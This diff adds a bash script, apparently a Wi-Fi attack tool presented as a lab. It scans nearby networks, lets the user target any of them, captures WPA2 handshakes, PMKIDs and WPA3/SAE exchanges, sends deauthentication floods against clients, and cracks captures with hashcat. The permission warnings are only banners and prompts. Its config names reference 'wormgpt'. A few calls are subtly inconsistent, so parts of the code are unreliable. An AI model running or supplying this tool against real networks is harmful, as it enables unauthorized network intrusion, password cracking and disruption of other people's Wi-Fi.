@@ -1,0 +1,522 @@
+#!/usr/bin/env bash
+# ============================================================================
+# WPA2 / WPA3 handshake capture lab - unified interactive tool
+#
+# Two strategies, one menu:
+#   A) MONITOR mode : airodump-ng / hcxdumptool captures (needs a card whose
+#                     monitor RX actually works - rtw88/RTL8821AU does NOT).
+#   B) AP LAB        : hostapd turns your adapter into your OWN WPA2 AP; a
+#                      client join produces the real 4-way handshake, captured
+#                      on the AP interface. Works on any AP-capable adapter,
+#                      no monitor mode needed.
+#
+# Test ONLY on networks you own / have explicit permission to audit.
+# ============================================================================
+set -uo pipefail
+
+IFACE="${1:-}"
+OUT_DIR="${2:-$HOME/lab}"
+BASE="cap"
+MON_IF=""
+MON_ENTERED=0
+CLEANED=0
+HAS_MON=0
+HAS_AP=0
+MON_RX=-1   # -1 untested, 0 broken, 1 working
+
+declare -a AP_BSSID=() AP_CH=() AP_ESSID=()
+TARGET_BSSID=""
+TARGET_CH=""
+TARGET_ESSID=""
+
+red()    { printf "\033[1;31m%s\033[0m\n" "$*"; }
+green()  { printf "\033[1;32m%s\033[0m\n" "$*"; }
+yellow() { printf "\033[1;33m%s\033[0m\n" "$*"; }
+cyan()   { printf "\033[1;36m%s\033[0m\n" "$*"; }
+
+banner() { cat <<'EOF'
+  ------------------------------------------------
+   WPA2 / WPA3 Handshake Capture Lab - Unified
+   Monitor flow + AP-lab flow in one tool
+   Use only on networks you own / are authorized
+  ------------------------------------------------
+EOF
+}
+
+die()    { red "[!] $*"; exit 1; }
+need()   { hash "$1" 2>/dev/null || die "Missing tool: '$1' (install '$2')"; }
+
+cleanup() {
+    [[ $CLEANED -eq 1 ]] && return
+    CLEANED=1
+    echo
+    yellow "[*] Cleaning up..."
+    [[ -n "${AP_IF:-}" ]] && pkill -f "tcpdump -i $AP_IF" >/dev/null 2>&1 || true
+    pkill -f "hostapd .*wormlab" >/dev/null 2>&1 || true
+    kill "${HOSTAPD_PID:-}" "${DNSMASQ_PID:-}" "${TCPDUMP_PID:-}" >/dev/null 2>&1 || true
+    pkill -f "airodump-ng" >/dev/null 2>&1 || true
+    if [[ -n "$MON_IF" ]] && [[ -e "/sys/class/net/$MON_IF" ]]; then
+        airmon-ng stop "$MON_IF" >/dev/null 2>&1 || true
+    fi
+    service NetworkManager restart >/dev/null 2>&1 || true
+    green "[+] Network manager restored."
+}
+trap cleanup INT TERM EXIT
+
+# ---------------------------------------------------------------- capability
+capabilities() {
+    local phy ifmode
+    phy="$(basename "$(readlink -f "/sys/class/net/$IFACE/phy80211")" 2>/dev/null)"
+    [[ -n "$phy" ]] || die "no phy found for $IFACE"
+    ifmode="$(iw phy "$phy" info 2>/dev/null)"
+    printf '%s' "$ifmode" | grep -qE '^\s+\* monitor' && HAS_MON=1
+    printf '%s' "$ifmode" | grep -qE '^\s+\* AP$|^\s+\* AP ' && HAS_AP=1
+
+    echo
+    cyan "[*] Adapter capabilities ($IFACE / phy$phy):"
+    printf '    monitor mode : %s\n' "$([[ $HAS_MON -eq 1 ]] && green YES || red NO)"
+    printf '    AP mode      : %s\n' "$([[ $HAS_AP -eq 1 ]] && green YES || red NO)"
+    if [[ $HAS_MON -eq 0 ]]; then
+        yellow "    -> monitor flow disabled. Use the AP-lab flow (option 5)."
+    elif [[ $HAS_AP -eq 0 ]] && [[ $MON_RX -eq 0 ]]; then
+        yellow "    -> no monitor + no AP = lab impossible on this card."
+    fi
+}
+
+# ---------------------------------------------------------------- monitor RX
+enter_monitor() {
+    [[ $MON_ENTERED -eq 1 ]] && return
+    yellow "[*] Stopping NetworkManager to free the card (net drops; restored on exit)..."
+    airmon-ng check kill >/dev/null 2>&1 || true
+    cyan "[*] Enabling monitor mode on $IFACE..."
+    airmon-ng start "$IFACE" | grep -iE "monitor|enabled|error" || true
+    sleep 1
+    MON_IF="$(find_mon_iface)"
+    [[ -n "$MON_IF" ]] || die "No monitor interface created"
+    ip link set "$MON_IF" up 2>/dev/null || true
+    MON_ENTERED=1
+    green "[+] Monitor interface: $MON_IF"
+}
+
+find_mon_iface() {
+    local m
+    m=$(iw dev 2>/dev/null | awk '/Interface/{n=$2} /type monitor/{print n}' | head -1)
+    [[ -n "$m" ]] && { echo "$m"; return; }
+    [[ -e "/sys/class/net/${IFACE}mon" ]] && { echo "${IFACE}mon"; return; }
+    [[ -e "/sys/class/net/$IFACE" ]] && { echo "$IFACE"; return; }
+}
+
+test_monitor_rx() {
+    need tcpdump tcpdump
+    enter_monitor
+    iw dev "$MON_IF" set channel 6 >/dev/null 2>&1 || true
+    yellow "[*] RX test: listening 5s for ANY 802.11 frame on ch6..."
+    timeout 5 tcpdump -i "$MON_IF" -c 5 -e >/dev/null 2>&1
+    local rc=$?
+    if [[ $rc -eq 0 ]]; then
+        MON_RX=1; green "    OK - monitor RX works, saw 5+ frames."
+    else
+        MON_RX=0; red "    FAIL - 0 frames in 5s. Monitor RX broken on this card/driver."
+        if [[ $HAS_AP -eq 1 ]]; then
+            green "    Use the AP-lab flow (option 5) instead - no monitor needed."
+        fi
+    fi
+    sleep 1
+}
+
+# ---------------------------------------------------------------- CSV parse
+parse_csv() {
+    AP_BSSID=(); AP_CH=(); AP_ESSID=()
+    local line
+    while IFS= read -r line; do
+        [[ "$line" == *"Station MAC"* ]] && break
+        [[ "$line" =~ ^[0-9A-Fa-f:]{17} ]] || continue
+        AP_BSSID+=("$(awk -F, '{gsub(/ /,"",$1); print $1}' <<<"$line")")
+        AP_CH+=("$(awk    -F, '{gsub(/ /,"",$4); print $4}' <<<"$line")")
+        AP_ESSID+=("$(awk -F, '{gsub(/ /,"",$14); print $14}' <<<"$line")")
+    done < "$1"
+}
+
+scan_fixed() {
+    local ch="$1" band="$2" secs="${3:-8}"
+    rm -f /tmp/wgscan*.csv >/dev/null 2>&1
+    iw dev "$MON_IF" set channel "$ch" >/dev/null 2>&1 || true
+    cyan "[*] Fixed ch $ch ($band), $secs s..."
+    airodump-ng --band "$band" -c "$ch" -w /tmp/wgscan --output-format csv "$MON_IF" >>/tmp/wgscan.log 2>&1 &
+    local pid=$!
+    sleep "$secs"
+    kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null
+    parse_csv /tmp/wgscan-01.csv 2>/dev/null
+}
+
+scan_wifi() {
+    enter_monitor
+    local secs="${1:-10}"
+    rm -f /tmp/wgscan*.csv /tmp/wgscan.log >/dev/null 2>&1
+    cyan "[*] Full-band scan $secs s..."
+    airodump-ng --band abg -w /tmp/wgscan --output-format csv "$MON_IF" >>/tmp/wgscan.log 2>&1 &
+    local pid=$!
+    sleep "$secs"
+    kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null
+
+    parse_csv /tmp/wgscan-01.csv 2>/dev/null
+    if [[ ${#AP_BSSID[@]} -eq 0 ]]; then
+        yellow "[-] Full-band scan empty. airodump-ng output:"
+        [[ -s /tmp/wgscan.log ]] && tail -8 /tmp/wgscan.log | sed 's/^/    /'
+        [[ $MON_RX -eq -1 ]] && test_monitor_rx
+        if [[ $MON_RX -eq 1 ]]; then
+            yellow "[-] RX works but full-band empty; trying fixed channels..."
+            scan_fixed 6 bg 8
+            if [[ ${#AP_BSSID[@]} -eq 0 ]]; then scan_fixed 157 a 8; fi
+        fi
+    fi
+
+    if [[ ${#AP_BSSID[@]} -eq 0 ]]; then
+        red "[-] No networks captured. Monitor RX: $([[ $MON_RX -eq 1 ]] && echo OK || echo BROKEN)."
+        red "    Card info:"
+        echo "    adapter: $(cat /sys/class/net/$MON_IF/device/product 2>/dev/null)"
+        echo "    driver : $(basename "$(readlink /sys/class/net/$MON_IF/device/driver 2>/dev/null)" 2>/dev/null)"
+        [[ $HAS_AP -eq 1 ]] && green "    -> Switch to the AP-lab flow (option 5)."
+        return 1
+    fi
+    green "[+] Found ${#AP_BSSID[@]} network(s)"
+}
+
+select_target() {
+    if [[ ${#AP_BSSID[@]} -eq 0 ]]; then
+        scan_wifi 12 || return 1
+    fi
+    echo
+    cyan "[*] Networks seen:"
+    local i
+    for i in "${!AP_BSSID[@]}"; do
+        printf "  %2d) %-17s  ch %-4s %s\n" "$((i+1))" "${AP_BSSID[$i]}" "${AP_CH[$i]}" "${AP_ESSID[$i]}"
+    done
+    echo "  0) Rescan"
+    local pick
+    while true; do
+        read -r -p "[>] Pick target (0 to rescan): " pick
+        if [[ "$pick" == "0" ]]; then
+            scan_wifi 12 || return 1
+            select_target; return
+        fi
+        [[ "$pick" =~ ^[0-9]+$ ]] && [[ "$pick" -ge 1 ]] && [[ "$pick" -le ${#AP_BSSID[@]} ]] && break
+    done
+    TARGET_BSSID="${AP_BSSID[$((pick-1))]}"
+    TARGET_CH="${AP_CH[$((pick-1))]}"
+    TARGET_ESSID="${AP_ESSID[$((pick-1))]}"
+    green "[+] Target set: $TARGET_BSSID  (ch $TARGET_CH)  '$TARGET_ESSID'"
+}
+
+# ---------------------------------------------------------------- monitor flows
+ensure_target() {
+    [[ -n "$TARGET_BSSID" ]] || select_target || die "Choose a network first (option 1)."
+}
+
+capture_wpa2() {
+    [[ $MON_RX -ne 0 ]] || { red "Monitor RX broken on this card - use the AP-lab flow (option 5)."; read -r -p "[>] Enter to return to menu"; return; }
+    ensure_target
+    local ts cap
+    ts="$(date +%H%M%S)"; cap="${BASE}-${ts}"
+    cyan "[*] Capturing handshake on $TARGET_BSSID (ch $TARGET_CH) -> ${OUT_DIR}/${cap}-01.cap"
+    echo "[*] Watch for:  WPA handshake: $TARGET_BSSID"
+    echo "[*] If none, toggle a client's WiFi (your phone)."
+    airodump-ng -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "${OUT_DIR}/${cap}" "$MON_IF" &
+
+    sleep 18
+    echo
+    read -r -p "[>] Deauth a client? enter client MAC, or ENTER to skip: " client
+    if [[ -n "$client" ]]; then
+        aireplay-ng -0 3 -a "$TARGET_BSSID" -c "$client" "$MON_IF"
+    else
+        read -r -p "[>] Broadcast deauth (only on YOUR network)? (y/N): " bc
+        [[ "${bc,,}" == "y" ]] && aireplay-ng -0 3 -a "$TARGET_BSSID" "$MON_IF"
+    fi
+
+    read -r -p "    ...press ENTER to stop capturing"
+    pkill -f "airodump-ng -c $TARGET_CH" >/dev/null 2>&1 || true
+    sleep 2
+
+    if aircrack-ng "${OUT_DIR}/${cap}-01.cap" 2>/dev/null | grep -qE "handshake"; then
+        green "[+] Handshake captured: ${OUT_DIR}/${cap}-01.cap"
+        aircrack-ng "${OUT_DIR}/${cap}-01.cap" | grep -iE "handshake|network key" || true
+    else
+        red "[-] No handshake yet. Retry and reconnect a client during the run."
+    fi
+}
+
+capture_pmkid() {
+    [[ $MON_RX -ne 0 ]] || { red "Monitor RX broken on this card - use the AP-lab flow (option 5)."; read -r -p "[>] Enter to return to menu"; return; }
+    need hcxdumptool hcxtools
+    need hcxpcapngtool hcxtools
+    ensure_target
+    yellow "[*] hcxdumptool PMKID capture on $TARGET_BSSID (Ctrl+C to stop)..."
+    hcxdumptool -i "$MON_IF" -o hcxdump --filterlist_ap="$TARGET_BSSID" --filtermode=2 || true
+    hcxpcaptool -z hash.22000 hcxdump >/dev/null 2>&1
+    [[ -s hash.22000 ]] && green "[+] PMKID saved: $OUT_DIR/hash.22000" \
+        || yellow "[-] No PMKID captured for this AP."
+}
+
+capture_sae() {
+    [[ $MON_RX -ne 0 ]] || { red "Monitor RX broken - use the AP-lab flow (option 5)."; read -r -p "[>] Enter to return to menu"; return; }
+    need hcxdumptool hcxtools
+    need hcxpcapngtool hcxtools
+    ensure_target
+    yellow "[*] hcxdumptool WPA3/SAE capture on $TARGET_BSSID (client must connect; Ctrl+C to stop)..."
+    hcxdumptool -i "$MON_IF" -o hcxdump --filterlist_ap="$TARGET_BSSID" --filtermode=2 --rds=1 || true
+    hcxpcaptool -z hash.22000 hcxdump >/dev/null 2>&1
+    [[ -s hash.22000 ]] && green "[+] WPA3 hash saved: $OUT_DIR/hash.22000" || yellow "[-] No capture."
+}
+
+# ---------------------------------------------------------------- AP lab flow
+ap_lab() {
+    [[ $HAS_AP -eq 1 ]] || { red "This adapter doesn't support AP mode."; return; }
+    for t in hostapd dnsmasq tcpdump; do need "$t" "$t"; done
+
+    local api ssid pass s channel
+    echo
+    read -r -p "[>] AP SSID    [WormLab]: " ssid;  ssid="${ssid:-WormLab}"
+    read -r -p "[>] WPA2 pass  [handshake123]: " pass; pass="${pass:-handshake123}"
+    [[ ${#pass} -ge 8 ]] || { red "passphrase needs >= 8 chars"; return; }
+    read -r -p "[>] Channel    [6]: " channel; channel="${channel:-6}"
+
+    yellow "[*] Starting lab AP '$ssid' (WPA2, ch $channel) on $IFACE..."
+    yellow "[*] Freeing interface from NetworkManager..."
+    airmon-ng check kill >/dev/null 2>&1 || true
+    ip link set "$IFACE" down
+    iw dev "$IFACE" set type managed 2>/dev/null
+    MON_ENTERED=0; MON_IF=""
+    ip addr flush dev "$IFACE"
+    ip addr add 10.10.0.1/24 dev "$IFACE"
+    ip link set "$IFACE" up
+    sleep 1
+    AP_IF="$IFACE"
+
+    local hc dns
+    hc="$(mktemp /tmp/wg-ap-hostapd.XXXX)" || return
+    dns="$(mktemp /tmp/wg-ap-dnsmasq.XXXX)" || return
+    cat > "$hc" <<EOF
+interface=$IFACE
+driver=nl80211
+ssid=$ssid
+hw_mode=g
+channel=$channel
+wpa=2
+wpa_passphrase=$pass
+wpa_key_mgmt=WPA-PSK
+rsn_pairwise=CCMP
+ignore_broadcast_ssid=0
+EOF
+    cat > "$dns" <<EOF
+interface=$IFACE
+dhcp-range=10.10.0.50,10.10.0.100,255.255.255.0,12h
+port=0
+EOF
+
+    hostapd "$hc" &> /tmp/wg-ap-hostapd.log &
+    HOSTAPD_PID=$!
+    sleep 4
+    kill -0 "$HOSTAPD_PID" 2>/dev/null || { red "hostapd failed:"; tail -10 /tmp/wg-ap-hostapd.log; return; }
+    green "[+] AP up."
+    dnsmasq -C "$dns" --no-daemon &> /tmp/wg-ap-dnsmasq.log &
+    DNSMASQ_PID=$!
+    sleep 1
+
+    local pcap
+    pcap="$OUT_DIR/ap-hs-$(date +%H%M%S).pcap"
+    yellow "[*] Capturing EAPOL handshake on $IFACE -> $pcap"
+    yellow "    NOW connect a device to '$ssid' with '$pass'"
+    tcpdump -i "$IFACE" -e -w "$pcap" 'ether proto 0x888e' &
+    TCPDUMP_PID=$!
+
+    read -r -p "[>] Press ENTER when the client connected..."
+    kill "$TCPDUMP_PID" >/dev/null 2>&1; wait "$TCPDUMP_PID" 2>/dev/null
+    sleep 1
+
+    green "[+] Capture saved: $pcap"
+    yellow "[*] EAPOL frames captured:"
+    if command -v tshark >/dev/null; then tshark -r "$pcap" 2>/dev/null | head -16;
+    else tcpdump -r "$pcap" 2>/dev/null | head -16; fi
+
+    local h22000
+    h22000="$OUT_DIR/lab-hs-$(date +%H%M%S).22000"
+    if command -v hcxpcapngtool >/dev/null; then
+        hcxpcapngtool "$pcap" -o "$h22000" >/dev/null 2>&1
+        if [[ -s "$h22000" ]]; then
+            green "[+] Handshake extracted -> hashcat -m 22000 $h22000 wordlist.txt"
+            if command -v hashcat >/dev/null; then
+                echo "$pass" > "$OUT_DIR/wordlist.txt"
+                echo "ok123456" >> "$OUT_DIR/wordlist.txt"
+                yellow "[*] Demo crack (tiny wordlist with your passphrase):"
+                hashcat -m 22000 "$h22000" "$OUT_DIR/wordlist.txt" --force --quiet 2>/dev/null \
+                    && grep "$pass" "$OUT_DIR/hashcat.potfile" 2>/dev/null >/dev/null \
+                    && green "    Cracked: password is '$pass'" \
+                    || yellow "    (hashcat run finished; check $OUT_DIR/hashcat.potfile)"
+            fi
+        else
+            yellow "[-] No EAPOL extracted - client may not have completed auth."
+        fi
+    else
+        yellow "[-] hcxtools not installed -> sudo apt install hcxtools"
+    fi
+}
+
+# ---------------------------------------------------------------- misc
+show_captures() {
+    echo
+    cyan "[*] Capture files in $OUT_DIR:"
+    ls -lh "$OUT_DIR" 2>/dev/null | grep -iE "cap|pcap|22000|hcxdump" \
+        || yellow "    (none yet)"
+    read -r -p "[-] Press ENTER to continue..."
+}
+
+diagnose() {
+    capabilities
+    [[ $HAS_MON -eq 1 ]] && test_monitor_rx
+    echo
+    cyan "[*] Manual checks you can run in a second terminal:"
+    cat <<EOF
+    sudo airmon-ng check kill
+    sudo ip link set $IFACE down
+    sudo iw dev $IFACE set type monitor
+    sudo ip link set $IFACE up
+    sudo timeout 8 airodump-ng $IFACE
+    # raw frame proof (0 packets = broken monitor RX):
+    sudo timeout 8 tcpdump -i $IFACE -c 20 -e
+EOF
+    read -r -p "[-] Press ENTER to continue..."
+}
+
+# ---------------------------------------------------------------- setup helpers
+CONF="$HOME/.wormgpt-lab.conf"
+
+load_conf() {
+    [[ -f "$CONF" ]] && { . "$CONF" 2>/dev/null || true; } || true
+}
+save_conf() {
+    printf 'SAVED_IFACE=%s\nSAVED_OUT_DIR=%s\n' "$IFACE" "$OUT_DIR" > "$CONF" 2>/dev/null || true
+}
+
+install_deps() {
+    local pkgs=(aircrack-ng hcxtools hostapd dnsmasq tcpdump tshark hashcat)
+    local miss=() t pm
+    for t in "${pkgs[@]}"; do
+        command -v "$t" >/dev/null 2>&1 || miss+=("$t")
+    done
+    if [[ ${#miss[@]} -eq 0 ]]; then
+        green "    all tools present"
+        return
+    fi
+    if command -v apt-get >/dev/null; then pm=apt
+    elif command -v dnf >/dev/null; then pm=dnf
+    elif command -v pacman >/dev/null; then pm=pacman
+    fi
+    if [[ -z "$pm" ]]; then
+        red "[-] Missing tools: ${miss[*]} - install them for your distro."
+        return
+    fi
+    yellow "[*] Installing missing tools: ${miss[*]}"
+    case "$pm" in
+        apt)   DEBIAN_FRONTEND=noninteractive apt-get update >/dev/null 2>&1
+               DEBIAN_FRONTEND=noninteractive apt-get install -y "${miss[@]}" || true ;;
+        dnf)   dnf install -y "${miss[@]}" || true ;;
+        pacman) pacman -Sy --noconfirm "${miss[@]}" || true ;;
+    esac
+}
+
+pick_interface() {
+    local -a opt=()
+    local i
+    for d in /sys/class/net/*; do
+        i="$(basename "$d")"
+        [[ -e "$d/phy80211" ]] || continue
+        case "$i" in *mon) continue;; esac
+        opt+=("$i")
+    done
+    [[ ${#opt[@]} -gt 0 ]] || die "no wireless interfaces found"
+    echo
+    cyan "[*] Wireless adapters:"
+    for i in "${!opt[@]}"; do
+        printf '   %d) %s\n' "$((i+1))" "${opt[$i]}"
+    done
+    local dflt="${SAVED_IFACE:-}"
+    local pick=""
+    read -r -p "[>] Select (1-${#opt[@]})${dflt:+, ENTER to reuse '$dflt'}: " pick
+    if [[ -z "$pick" ]] && [[ -n "$dflt" ]] && [[ -e "/sys/class/net/$dflt" ]]; then
+        IFACE="$dflt"
+    elif [[ "$pick" =~ ^[0-9]+$ ]] && [[ "$pick" -ge 1 ]] && [[ "$pick" -le ${#opt[@]} ]]; then
+        IFACE="${opt[$((pick-1))]}"
+    else
+        die "invalid adapter selection"
+    fi
+    green "[+] Using $IFACE"
+}
+
+# ---------------------------------------------------------------- menu
+main_menu() {
+    local mon_label ap_label
+    while true; do
+        clear
+        banner
+        echo "[ Main Menu ]  iface: $IFACE | dir: $OUT_DIR"
+        if [[ $HAS_MON -eq 1 ]]; then
+            mon_label=$( [[ $MON_RX -eq 1 ]] && green "OK" || [[ $MON_RX -eq 0 ]] && red "BROKEN" || yellow "untested" )
+        else
+            mon_label=$(red "unsupported")
+        fi
+        ap_label=$( [[ $HAS_AP -eq 1 ]] && green "OK" || red "unsupported" )
+        printf '    monitor RX : %s      AP mode : %s\n' "$mon_label" "$ap_label"
+        if [[ -n "$TARGET_BSSID" ]]; then
+            cyan "    Target: $TARGET_BSSID  (ch $TARGET_CH)  '$TARGET_ESSID'"
+        else
+            yellow "    No target selected"
+        fi
+        echo
+        echo " 1) Scan / select WiFi network          (monitor)"
+        echo " 2) Capture WPA1/WPA2 handshake         (monitor)"
+        echo " 3) Capture WPA2 PMKID                  (monitor)"
+        echo " 4) Capture WPA3/SAE                    (monitor)"
+        echo " 5) WPA2 lab AP (hostapd) - NO monitor  (works on this card)"
+        echo " 6) Diagnose capabilities/monitor RX"
+        echo " 7) Show captured files"
+        echo " 8) Exit"
+        read -r -p $'\n[>] Select (1-8): ' choice
+        case "$choice" in
+            1) select_target ;;
+            2) capture_wpa2 ;;
+            3) capture_pmkid ;;
+            4) capture_sae ;;
+            5) ap_lab ;;
+            6) diagnose ;;
+            7) show_captures ;;
+            8) cleanup; exit 0 ;;
+            *) yellow "Invalid choice" ;;
+        esac
+        [[ "$choice" =~ ^[1-7]$ ]] && read -r -p "[-] Press ENTER to continue..."
+    done
+}
+
+main() {
+    banner
+    [[ $EUID -eq 0 ]] || die "Run with sudo: sudo ./handshake-cap.sh"
+
+    cyan "[*] Checking/installing dependencies..."
+    install_deps
+
+    load_conf
+    [[ -z "${2:-}" ]] && [[ -n "${SAVED_OUT_DIR:-}" ]] && OUT_DIR="$SAVED_OUT_DIR"
+    if [[ -z "$IFACE" ]]; then
+        pick_interface
+        save_conf
+    fi
+    [[ -e "/sys/class/net/$IFACE" ]]          || die "Interface $IFACE not found"
+    [[ -e "/sys/class/net/$IFACE/phy80211" ]] || die "$IFACE is not a wireless interface"
+
+    mkdir -p "$OUT_DIR"
+    cd "$OUT_DIR" || die "cannot cd $OUT_DIR"
+
+    capabilities
+    main_menu
+}
+
+main "$@"
